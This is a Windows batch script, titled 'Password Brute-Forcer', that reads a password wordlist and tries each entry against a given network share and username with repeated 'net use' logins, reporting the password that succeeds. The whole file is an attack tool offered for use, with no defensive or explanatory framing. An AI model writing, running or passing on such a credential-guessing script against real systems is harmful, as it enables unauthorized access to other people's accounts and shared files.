@echo off
title Password Brute-Forcer
echo.

set "network_path=%1"
set "password_file=%2"
set "username=%3"
set /a count=1

for /f "delims=" %%a in (%password_file%) do (
    set "pass=%%a"
    call :login
)
echo Password not found.
pause
exit /b

:found
echo.
echo Password found - %pass%.
net use %network_path% /d /y >nul 2>&1
pause
exit /b

:login
net use %network_path% /user:%username% %pass% >nul 2>&1
echo LOGIN ATTEMPT: %count% - %pass%
set /a count+=1
if %errorlevel% EQU 0 goto found
